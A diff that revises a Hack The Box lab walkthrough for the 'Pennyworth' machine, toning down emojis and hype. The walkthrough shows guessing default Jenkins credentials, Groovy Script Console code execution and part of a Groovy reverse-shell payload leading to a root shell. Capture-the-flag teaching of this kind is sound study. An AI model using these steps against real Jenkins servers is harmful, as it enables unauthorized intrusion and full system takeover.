@@ -1,17 +1,17 @@
-# 🕵️ Pennyworth – Hack The Box Walkthrough  
+# Pennyworth – Hack The Box Walkthrough  
 ### Prepared by: 0ne-nine9, ilinor  
 
 ---
 
-## 📌 Introduction
+## Introduction
 
 In the vast landscape of cybersecurity, vulnerabilities are the gateways attackers exploit to breach systems. One such category — **Remote Code Execution (RCE)** — stands among the most dangerous! Vulnerabilities are often tracked using **CVEs** (Common Vulnerabilities and Exposures), and scored with a **CVSS** rating from 0 (Informational) to 10 (Critical). A key trait of any severe vulnerability is how it impacts the **CIA Triad**: Confidentiality, Integrity, and Availability.
 
-This write-up explores a real-world RCE vector in action on the **Pennyworth** machine from Hack The Box — where attackers use Jenkins, weak credentials, and Groovy scripting to pop a root shell. Let's go!
+This write-up covers the **Pennyworth** machine: Jenkins exposure, weak or default credentials, and Groovy-based remote code execution leading to elevated access.
 
 ---
 
-## 🔎 Enumeration
+## Enumeration
 
 We start, as always, with **Nmap**, our reconnaissance Swiss army knife:
 
@@ -23,9 +23,9 @@ nmap -sC -sV -oA nmap/pennyworth 10.10.11.143
 - `-sV`: Version detection
 - `-oA`: Save output to all formats
 
-💥 **Findings**:
+ **Findings**:
 
-```
+```text
 8080/tcp open  http    Jetty 9.4.39.v20210325
 ```
 
@@ -35,30 +35,30 @@ We observe **Jetty** running on port **8080**, not the usual port 80. This impli
 http://10.10.11.143:8080/
 ```
 
-Visiting this in a browser? BOOM! It’s a **Jenkins** instance!
+In a browser, the service presents a **Jenkins** web interface.
 
 ---
 
-## 🛠️ What Is Jenkins?
+## What Is Jenkins?
 
 Jenkins is a free and open-source automation server. It powers DevOps pipelines — automating building, testing, and deployment of applications. Because it runs system-level tasks, any misconfiguration can be catastrophic.
 
 ---
 
-## 🔐 Bruteforce Login Attempt
+## Bruteforce Login Attempt
 
 Facing a Jenkins login page, we immediately try a series of **common weak credential pairs**:
 
 - admin:admin  
 - root:root  
 - admin:password  
-- **root:password** ✅ SUCCESS!
+- **root:password**  SUCCESS!
 
-We’re in. We now have full access to the Jenkins **Admin Panel**. HUGE win.
+Jenkins **Manage Jenkins** / admin functions are accessible with the recovered credentials.
 
 ---
 
-## 📜 Foothold via Jenkins Script Console
+## Foothold via Jenkins Script Console
 
 Jenkins includes a **Script Console**, which allows administrators to run **Groovy scripts** directly on the server — a perfect attack vector for RCE if accessed by unauthorized users.
 
@@ -76,9 +76,9 @@ http://10.10.11.143:8080/script
 
 ---
 
-## 💣 Getting a Reverse Shell with Groovy
+## Getting a Reverse Shell with Groovy
 
-We find an awesome Groovy reverse shell payload on GitHub. Let’s prep it.
+Use a standard **Groovy** reverse-shell snippet (from vendor documentation or trusted security references) and adapt host/port values.
 
 First, grab your Kali’s VPN IP:
 
@@ -114,36 +114,36 @@ p.destroy();
 s.close();
 ```
 
-💡 Breakdown:
+ Breakdown:
 - `host` and `port`: tell the target where to connect.
 - `cmd`: `/bin/bash` since this is a Linux box.
 - The loop: keeps the connection alive, relaying input/output between you and the target.
 
 Paste it into the **Script Console**, click **Run**...
 
-AND BOOM 💥 — your netcat terminal receives a connection!
+The listener should then show an incoming connection.
 
 ---
 
-## 📟 Interactive Shell Access
+## Interactive Shell Access
 
-You’re now on the system. Time to confirm shell:
+With execution confirmed, validate the session and stabilize if needed:
 
 ```bash
 whoami
 id
 ```
 
-🚀 Output:
+ Output:
 
-```
+```text
 root
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-YOU. ARE. GOD. MODE. 😈
+YOU. ARE. GOD. MODE. 
 
-Let’s prove it:
+Validate execution with:
 
 ```bash
 cd /root
@@ -151,11 +151,11 @@ ls
 cat root.txt
 ```
 
-🎉 Flag Captured!
+ Flag Captured!
 
 ---
 
-## 🧠 Conclusion
+## Conclusion
 
 This machine demonstrates how critical **default credentials**, **outdated services**, and **misconfigured admin panels** can be for exploitation. The entire attack path:
 
@@ -169,7 +169,7 @@ This attack mimics real-world scenarios where DevOps tools are misconfigured or 
 
 ---
 
-## 🎯 Key Commands Recap
+## Key Commands Recap
 
 ```bash
 # Nmap Scan
@@ -184,7 +184,7 @@ ip a | grep tun0
 
 ---
 
-## 🔐 Bonus: Netcat Usage Explained
+## Bonus: Netcat Usage Explained
 
 Netcat (`nc`) is a versatile tool for listening and connecting to ports:
 
@@ -201,13 +201,13 @@ This line makes your Kali box act like a server, ready to receive a shell from t
 
 ---
 
-## 🏁 Mission Complete
+## Mission Complete
 
-- ✅ Initial Access via Jenkins weak creds  
-- ✅ RCE via Groovy Script Console  
-- ✅ Root shell obtained  
-- ✅ Root flag captured  
+-  Initial Access via Jenkins weak creds  
+-  RCE via Groovy Script Console  
+-  Root shell obtained  
+-  Root flag captured  
 
-You've just performed a full-blown Jenkins exploitation with reverse shell execution like a professional adversary.
+The exercise demonstrates Jenkins abuse leading to remote command execution and a reverse shell under realistic misconfiguration assumptions.
 
-🔥 That’s a wrap, hacker! On to the next box. 🔥
+ That’s a wrap, hacker! On to the next box.
